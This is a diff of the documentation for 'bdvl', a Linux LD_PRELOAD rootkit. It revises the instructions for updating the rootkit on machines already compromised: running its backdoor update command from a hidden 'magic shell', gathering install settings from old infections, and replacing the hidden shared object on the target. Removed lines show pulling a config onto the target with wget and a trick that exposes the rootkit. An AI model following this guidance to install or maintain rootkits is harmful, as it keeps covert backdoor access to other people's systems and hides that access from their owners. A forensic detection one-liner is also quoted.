@@ -5,9 +5,7 @@
    * [Installation example](#21-installation-example)
  * 3. [Updating existing installations](#3-updating-existing-installations)
    * [Seamless updates](#31-seamless-updates)
-   * [Updates to code-base only](#32-updates-to-code-base-only)
-   * [Updates to bedevil.h](#33-updates-to-bedevilh)
-   * [Notes](#33-notes)
+   * [Updating an old bdvl](#32-updating-an-old-bdvl)
  * 4. [Features & configuration information](#4-features-configuration-information)
    * [Backdoor utility commands](#41-backdoor-utility-commands)
    * [Magic GID](#42-magic-gid)
@@ -106,18 +104,12 @@
  * The **newest** version of bdvl comes with an option which allows for seamless updates to the rootkit on systems which already have it installed.
  * You can access this via the rootkit's [backdoor utilities](#41-backdoor-utility-commands) when in a magic shell.
  * The command & required arguments are as follows: `./bdv update /path/to/newbdvl.so*`
- * When updating the target installation, bdvl will read required settings from the target(s) `bdvl.so`.
-   * `INSTALL_DIR`, `OLD_PRELOAD`, `PRELOAD_FILE` & `BDVLSO` are said settings.
-   * Before installing the new `bdvl.so` bdvl will ask if `PATCH_DYNAMIC_LINKER` is defined in the new installation...
+ * When updating the target installation, bdvl will read necessary settings from the first `bdvl.so` in argv.
  * With the implementation of this, you can effortlessly enable/disable rootkit features, change backdoor credentials & whatever else, on the fly.
  * When using this option, directories & files from the previous/current installation are removed.
    * There is an appropriate warning to let you know this before bdvl goes through with updating the installation.
- * This method of updating the rootkit rehomes the kit entirely.
-   * Your home directory will be in a different location...
-   * Different installation directory, different `rootkit.so` name...
-   * Different log locations... Different everything.
-   * Other than which backdoor methods you are using & your desired backdoor credentials.
-     * **i.e.:** your own personal settings...
+ * With this method you do not need to worry about using the same paths, magic GID, or any other setting for that matter.
+   * Other than your backdoor credentials, if you want to keep them the same that is...
 
 #### 3.1.1. Example
  * In this example, I am in a backdoor shell & have this repository downloaded & extracted in my/the rootkit's home directory.
@@ -151,59 +143,24 @@ Connection to remule closed.
  * But that doesn't mean you can't update old versions...
    * It's possible, however it will take a little more effort...
    * Not a great deal though. Think of it like a cross referencing game...
- * The below sections, ([Updates to code-base only](#32-updates-to-code-base-only) & [Updates to bedevil.h](#33-updates-to-bedevilh)) aptly detail this process.
+ * The below section, ([Updating an old bdvl](#32-updating-an-old-bdvl) aptly details this process.
 
-### 3.2. Updates to code-base only
- * In most cases, there will only be changes to the code-base & not the contents of `bedevil.h` itself.
-   * In this case, all you need to do is replace `newinc/bedevil.h` with **your** `<PAM_UNAME>.h`.
-   * Then `make` & replace the existing rootkit.so's with the newly compiled ones.
- * **Example** (*logged in & hidden on target machine inside cloned/updated bdvl*):
-```
-wget https://url.to/mybedevil.h -O newinc/bedevil.h &&
-make && 
-mv build/*.x86_64 ~/install_dir/`./bdv soname`.x86_64 && 
-mv build/*.i686 ~/install_dir/`./bdv soname`.i686 2>/dev/null
-```
- * Of course your target might be on a different platform or you may have access to `mybedevil.h` somehow else but the idea is fundamentally the same.
- * Before going full steam ahead with installing a new version of bdvl, you **very much should triple-check** you won't wreck anything or accidentally leave some unhidden & pretty odd looking directory behind from the **first installation**.
- * Do this by checking bedevil.h. More on that below.
-
-### 3.3. Updates to bedevil.h
- * It could be that there have been new additions to `bedevil.h`, or maybe some things have been removed.
- * If this is the case, have a look. See what has changed.
-   * The header is aptly commented & spaced out by `setup.py` so that you know what exactly everything is.
-   * The comments in the header are intended to be markers, making cross-referencing settings & values much easier.
- * Really it is just a case of adding or removing stuff in the new header.
-   * Adding stuff should there be new settings or arrays to take care of.
-   * Or removing stuff... If particular settings or arrays have been removed from the kit for whatever reason.
- * By cross-referencing the new `bedevil.h` with your `<PAM_UNAME>.h` you can determine what needs changed.
-   * Don't rush.
-   * When you see something that needs changed, **replace all** (Ctrl+H or equivalent), if it is a string, in the new header with what **you** already have for that certain setting/value.
-   * **Replacing all** is important as there may be parts of a target string within another. (for example your string could a substring in an array)
- * If you are replacing a constant, it is accompanied by `LEN_{NAME}`.
-   * **Make sure this value & actual character length match!!**
- * Once you're 100% definite that the new updated header matches **your own** configuration & settings close enough to the point that you will be using the same paths, magic GID etc. you are good to update your installation.
-   * It could be worth your time installing in a test environment beforehand, just to verify everything is a-ok.
- * **Example** (*logged in & hidden on target machine inside cloned/updated bdvl*):
-```
-make &&
-mv build/*.x86_64 ~/install_dir/`./bdv soname`.x86_64 &&
-mv build/*.i686 ~/install_dir/`./bdv soname`.i686 2>/dev/null
-```
- * Of course you might be on a different platform but the idea remains the same.
-
-### 3.3. Notes
-
- * Automating this process sounds like it would be a good idea, but very messy.
- * If you are using a **much** older version of bdvl & did not get a copy of `bedevil.h` before installation, or do not have access to `./bdv update` gather what settings you can about the current installation.
-   * **The most important settings you must know**:
-     * `INSTALL_DIR`, `BDVLSO` (+ `SOPATH`)
-     * `PRELOAD_FILE`
-   * As long as you know at least these you can update your super old installation of bdvl.
- * In the examples shown for installing an update of bdvl, `./bdv soname` is used.
-   * If your target is an older version of bdvl it will not have this option available.
-   * In that case just manually replace `./bdv soname` in the examples with the actual name of the rootkit.so on the target machine.
-     * For example `librocker.so` might be the soname for the target installation...
+### 3.2. Updating an old bdvl
+ * Depending on how old the target installation is, you may or may not have the `bedevil.h` for it. (likely not)
+ * It is *fairly* simple to upgrade an old version, if you're careful about it.
+ * You'll need to gather what settings you can from the current installation.
+ * At the absolute very least, what you need to know is:
+   * `INSTALL_DIR`, `PRELOAD_FILE`/`OLD_PRELOAD` & `BDVLSO`
+ * Anything else, for example paths, you can determine is a bonus so you don't have to worry about things becoming unhidden...
+   * If the target installation is that old, it won't do anything even akin to uninstalling itself, so take care.
+ * Everything you've gathered needs to go into `inc/bedevil.h` after a `make`.
+ * It will also be worth checking if new dependencies are required for the rootkit since the installation's version.
+   * **i.e.** run `etc/depinstall.sh`
+ * bdvl's resulting `config.h`may be worth checking also.
+ * Once everything you have gathered is in `bedevil.h` & the `*_LEN` values match up, `make kit` to make sure everything went well.
+   * If it compiles successfully, you can replace the existing `bdvl.so` on the target system with the new one.
+     * **i.e.** replace `/lib/guojkvn/guojkvn.so.x86_64` with the newly compiled `./build/bdvl.so.x86_64`
+   * It may perhaps be worth your time installing in a test environment before you ruin a box.
 
 <hr>
 
@@ -436,15 +393,6 @@ mv build/*.i686 ~/install_dir/`./bdv soname`.i686 2>/dev/null
 <hr>
 
 ### 5. Other notes
- * While bdvl's __DO_EVASIONS__ functionality (*see [Scary things](#scary-things)*) is effective, it also presents a fairly big weakness.
-   * `while true; do ldd /bin/ls >/dev/null; done`
-   * This very small while loop will temporarily remove the rootkit... Until the loop is killed.
-   * Leaving an open window to do some digging around in a new clean shell.
-     * Rootkit files & processes will not be hidden...
-     * Hidden ports will no longer be hidden... 
-     * The rootkit will be visibly loaded in other (infected) process' memory map files...
-   * Mitigating something like this could be tough...
-
  * Behaviour exhibited by __PATCH_DYNAMIC_LINKER__ can be observed by a regular user.
    * https://twitter.com/ForensicITGuy/status/1170149837490262016
      * `find /lib*/ -name 'ld-2*.so' -exec grep '/etc/ld.so.preload' {} \;`
